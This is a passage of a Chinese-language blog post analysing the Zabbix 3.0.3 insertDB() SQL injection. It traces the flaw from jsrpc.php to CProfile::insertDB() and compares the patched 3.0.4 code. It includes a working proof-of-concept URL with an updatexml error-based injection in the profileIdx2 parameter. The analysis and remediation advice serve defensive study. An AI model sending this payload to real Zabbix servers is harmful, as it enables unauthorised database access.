class="line">		<span class="comment">//关键点，使用zbx_dbstr()进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; zbx_dbstr($idx2)</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="4-jsrpc-php页面漏洞触发分析"><a href="#4-jsrpc-php页面漏洞触发分析" class="headerlink" title="4. jsrpc.php页面漏洞触发分析"></a>4. jsrpc.php页面漏洞触发分析</h3><h4 id="4-1-漏洞代码分析"><a href="#4-1-漏洞代码分析" class="headerlink" title="4.1 漏洞代码分析"></a>4.1 漏洞代码分析</h4><p><code>jsrpc.php</code>中180行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">......</div><div class="line"><span class="keyword">if</span> ($requestType == PAGE_TYPE_JSON) &#123;</div><div class="line">	$http_request = <span class="keyword">new</span> CHttpRequest();</div><div class="line">	$json = <span class="keyword">new</span> CJson();</div><div class="line">	$data = $json-&gt;decode($http_request-&gt;body(), <span class="keyword">true</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	<span class="comment">//关键点，获取输入参数</span></div><div class="line">	$data = $_REQUEST;</div><div class="line">&#125;</div><div class="line">......</div><div class="line"><span class="keyword">if</span> (!is_array($data) || !<span class="keyword">isset</span>($data[<span class="string">'method'</span>])</div><div class="line">		|| ($requestType == PAGE_TYPE_JSON &amp;&amp; (!<span class="keyword">isset</span>($data[<span class="string">'params'</span>]) || !is_array($data[<span class="string">'params'</span>])))) &#123;</div><div class="line">	fatal_error(<span class="string">'Wrong RPC call to JS RPC!'</span>);</div><div class="line">&#125;</div><div class="line">......</div><div class="line"><span class="keyword">switch</span> ($data[<span class="string">'method'</span>]) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="string">'host.get'</span>:</div><div class="line">	......</div><div class="line">	<span class="keyword">case</span> <span class="string">'message.mute'</span>:</div><div class="line">	.......</div><div class="line">	<span class="keyword">case</span> <span class="string">'screen.get'</span>:</div><div class="line">		$result = <span class="string">''</span>;</div><div class="line">		<span class="comment">//关键点</span></div><div class="line">		$screenBase = CScreenBuilder::getScreen($data);</div><div class="line">		<span class="keyword">if</span> ($screenBase !== <span class="keyword">null</span>) &#123;</div><div class="line">			$screen = $screenBase-&gt;get();</div><div class="line"></div><div class="line">			<span class="keyword">if</span> ($data[<span class="string">'mode'</span>] == SCREEN_MODE_JS) &#123;</div><div class="line">				$result = $screen;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span> &#123;</div><div class="line">				<span class="keyword">if</span> (is_object($screen)) &#123;</div><div class="line">					$result = $screen-&gt;toString();</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	......</div><div class="line">	&#125;</div><div class="line">......</div></pre></td></tr></table></figure></p>
+<p><strong><code>$data</code>获得所有传入参数，可控</strong>   </p>
+<p><code>type</code>必须传入，且不能为常量<code>PAGE_TYPE_JSON</code>(6)，<code>defines.inc.php</code>中定义常量   </p>
+<p>当<code>method</code>赋值为<code>screen.get</code>，调用<code>CScreenBuilder::getScreen($data)</code>，跟进到<code>CScreenBuilder.php</code>中171行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getScreen</span><span class="params">(array $options = [])</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">if</span> ($options[<span class="string">'resourcetype'</span>] === <span class="keyword">null</span>) &#123;</div><div class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">			&#125;</div><div class="line">	<span class="keyword">switch</span> ($options[<span class="string">'resourcetype'</span>]) &#123;</div><div class="line">		<span class="keyword">case</span> SCREEN_RESOURCE_GRAPH:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">new</span> CScreenGraph($options);</div><div class="line">		......</div><div class="line">		<span class="keyword">case</span> SCREEN_RESOURCE_DISCOVERY:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">new</span> CScreenDiscovery($options);</div><div class="line">		<span class="keyword">default</span>:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>提交参数时如果设置<code>resourcetype</code>，然后一系列可能的返回都是一个继承自<code>CScreenBase</code>的实例，以resourcetype=17为例，CScreenHostTriggers无自己的构造方法，实例化的时候将执行父类CScreenBase的构造方法.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CScreenHostTriggers</span> <span class="keyword">extends</span> <span class="title">CScreenBase</span> </span>&#123;.....&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CScreenHistory</span> <span class="keyword">extends</span> <span class="title">CScreenBase</span> </span>&#123;......)</div></pre></td></tr></table></figure></p>
+<p>跟进到<code>CScreenBase.php</code>中的构造方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $options = [])</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="comment">// Get resourcetype.</span></div><div class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;resourcetype === <span class="keyword">null</span> &amp;&amp; array_key_exists(<span class="string">'resourcetype'</span>,<span class="keyword">$this</span>-&gt;screenitem)) &#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;resourcetype = <span class="keyword">$this</span>-&gt;screenitem[<span class="string">'resourcetype'</span>];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;parameters <span class="keyword">as</span> $pname =&gt; $default_value) &#123;</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;required_parameters[$pname]) &#123;</div><div class="line">			<span class="keyword">$this</span>-&gt;$pname = array_key_exists($pname, $options) ? $options[$pname] : $default_value;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Get page file.</span></div><div class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;required_parameters[<span class="string">'pageFile'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;pageFile === <span class="keyword">null</span>) &#123;</div><div class="line">		<span class="keyword">global</span> $page;</div><div class="line">		<span class="keyword">$this</span>-&gt;pageFile = $page[<span class="string">'file'</span>];</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Calculate timeline.</span></div><div class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;required_parameters[<span class="string">'timeline'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;timeline === <span class="keyword">null</span>) &#123;</div><div class="line">		<span class="comment">//关键函数调用calculateTime()</span></div><div class="line">		<span class="keyword">$this</span>-&gt;timeline = <span class="keyword">$this</span>-&gt;calculateTime([</div><div class="line">			<span class="string">'profileIdx'</span> =&gt; <span class="keyword">$this</span>-&gt;profileIdx,</div><div class="line">			<span class="comment">//关键参数</span></div><div class="line">			<span class="string">'profileIdx2'</span> =&gt; <span class="keyword">$this</span>-&gt;profileIdx2,</div><div class="line">			<span class="string">'updateProfile'</span> =&gt; <span class="keyword">$this</span>-&gt;updateProfile,</div><div class="line">			<span class="string">'period'</span> =&gt; array_key_exists(<span class="string">'period'</span>, $options) ? $options[<span class="string">'period'</span>] : <span class="keyword">null</span>,</div><div class="line">			<span class="string">'stime'</span> =&gt; array_key_exists(<span class="string">'stime'</span>, $options) ? $options[<span class="string">'stime'</span>] : <span class="keyword">null</span></div><div class="line">		]);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>如果传入<code>profileIdx2</code>参数，它将未经任何过滤地传给<code>CScreenBase::calculateTime()</code>，跟进到<code>CScreenBase.php</code>中425行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">calculateTime</span><span class="params">(array $options = [])</span> </span>&#123;</div><div class="line">......</div><div class="line"><span class="keyword">if</span> ($options[<span class="string">'updateProfile'</span>] &amp;&amp; !<span class="keyword">empty</span>($options[<span class="string">'profileIdx'</span>])) &#123;</div><div class="line">		<span class="comment">//关键点</span></div><div class="line">		CProfile::update($options[<span class="string">'profileIdx'</span>].<span class="string">'.period'</span>, $options[<span class="string">'period'</span>], PROFILE_TYPE_INT, $options[<span class="string">'profileIdx2'</span>]);</div><div class="line">			&#125;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>发现<code>CProfile::update()</code>被调用，且<code>$options[&#39;profileIdx2&#39;]</code>为第4个参数，即形参<code>$idx2</code>。如果再<code>insertDB()</code>被调用时，<code>profileIdx2</code>参数被带进最终执行语句.   </p>
+<p>返回到<code>jsrpc.php</code>中调用<code>CScreenBuilder::getScreen($data)</code>后的部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$screenBase = CScreenBuilder::getScreen($data);</div><div class="line"><span class="keyword">if</span> ($screenBase !== <span class="keyword">null</span>) &#123;</div><div class="line">	$screen = $screenBase-&gt;get();</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ($data[<span class="string">'mode'</span>] == SCREEN_MODE_JS) &#123;</div><div class="line">		$result = $screen;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> (is_object($screen)) &#123;</div><div class="line">			$result = $screen-&gt;toString();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>$screenBase</code>不能为null意味着必须设置<code>resourcetype</code>参数<br>要使参数提交结果返回，需要设置<code>mode</code>参数不为3或者不设置   </p>
+<p><code>jsrpc.php</code>末尾包含进<code>page_footer.php</code>，最终调用缺陷函数<code>CProfile::insertDB()</code>，<code>profileIdx2</code>参数被执行，产生注入.   </p>
+<p>总结调用流程：<br><code>$data = $_REQUEST   ---&gt;    CScreenBuilder::getScreen()   ---&gt;    CScreenBase::__construct()   ---&gt;    CScreenBase::calculateTime()   ---&gt;   CProfile::update()   ---&gt;   CScreenBase::get()   ---&gt;   require_once()   ---&gt;   CProfile::flush()   ---&gt;   CProfile::insertDB()   ---&gt;   CProfile::DBexecute()</code>   </p>
+<p>PoC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../zabbix/jsrpc.php?type=9&amp;method=screen.get&amp;profileIdx=1&amp;updateProfile=1&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=1&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&amp;resourcetype=16&amp;profileIdx2=666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23</div></pre></td></tr></table></figure></p>
+<h4 id="4-2-补丁对比"><a href="#4-2-补丁对比" class="headerlink" title="4.2 补丁对比"></a>4.2 补丁对比</h4><p>zabbix 最新版3.0.4中，没有对<code>jsrpc.php</code>页面进行任何改动，仍然能传入任意参数。但是修复了<code>CProfile::insertDB()</code>的缺陷，增加了对<code>$idx2</code>的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.3 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，未进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; $idx2</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.4 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，使用zbx_dbstr()进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; zbx_dbstr($idx2)</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="5-修复意见"><a href="#5-修复意见" class="headerlink" title="5. 修复意见"></a>5. 修复意见</h3><ol>
+<li>更新到最新3.0.4版本，补丁详情：<a href="https://support.zabbix.com/browse/ZBX-11023" target="_blank" rel="external">https://support.zabbix.com/browse/ZBX-11023</a></li>
+<li>禁用guest登陆功能</li>
+<li>修改管理员账户默认密码</li>
+</ol>
+<h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><ul>
+<li><a href="https://www.seebug.org/vuldb/ssvid-92301" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-92301</a></li>
+<li><a href="https://www.seebug.org/vuldb/ssvid-92302" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-92302</a></li>
+<li><a href="https://support.zabbix.com/browse/ZBX-11023" target="_blank" rel="external">https://support.zabbix.com/browse/ZBX-11023</a></li>
+<li><a href="https://packetstormsecurity.com/files/138312" target="_blank" rel="external">https://packetstormsecurity.com/files/138312</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/08/17/Topsec_ELCO_Analy/">
+                    Topsec ECLO 漏洞利用分析
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/08/05/deployDjango_Nginx_uWSGI/">
+                    使用uWSGI和Nginx部署Django
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Zabbix-insertDB-注入漏洞分析"><span class="toc-text">Zabbix insertDB()注入漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、漏洞概述"><span class="toc-text">一、漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-漏洞简介"><span class="toc-text">1. 漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞影响"><span class="toc-text">2. 漏洞影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-漏洞触发条件"><span class="toc-text">3. 漏洞触发条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、漏洞复现（以3-0-3为例）"><span class="toc-text">二、漏洞复现（以3.0.3为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-环境搭建"><span class="toc-text">1. 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞函数分析"><span class="toc-text">2. 漏洞函数分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-latest-php页面漏洞触发分析"><span class="toc-text">3. latest.php页面漏洞触发分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-漏洞代码分析"><span class="toc-text">3.1 漏洞代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-补丁对比"><span class="toc-text">3.2 补丁对比</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-jsrpc-php页面漏洞触发分析"><span class="toc-text">4. jsrpc.php页面漏洞触发分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-漏洞代码分析"><span class="toc-text">4.1 漏洞代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-补丁对比"><span class="toc-text">4.2 补丁对比</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-修复意见"><span class="toc-text">5. 修复意见</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、参考"><span class="toc-text">三、参考</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Zabbix insertDB()注入漏洞分析　| DshtAnger　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/08/17/Topsec_ELCO_Analy/" title="上一篇: Topsec ECLO 漏洞利用分析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/08/05/deployDjango_Nginx_uWSGI/" title="下一篇: 使用uWSGI和Nginx部署Django">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/10/09/using_Hexo_buildBlog/">使用Hexo建立博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/17/Topsec_ELCO_Analy/">Topsec ECLO 漏洞利用分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/15/Zabbix_insertDB_Injection/">Zabbix insertDB()注入漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/05/deployDjango_Nginx_uWSGI/">使用uWSGI和Nginx部署Django</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016 DshtAnger
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
